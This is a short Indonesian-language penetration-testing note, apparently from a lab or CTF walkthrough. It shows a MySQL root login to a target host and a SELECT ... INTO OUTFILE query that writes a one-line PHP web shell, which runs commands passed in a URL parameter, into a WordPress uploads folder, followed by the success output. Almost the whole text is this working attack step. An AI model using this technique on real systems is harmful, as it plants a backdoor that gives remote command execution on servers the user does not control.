Jika mendapat akses ke mysql, kita bisa upload shell
```
root@kali:~# mysql -uroot -pplbkac -h 192.168.1.32  

mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";**  
Query OK, 1 row affected (0.00 sec)

mysql> exit  
```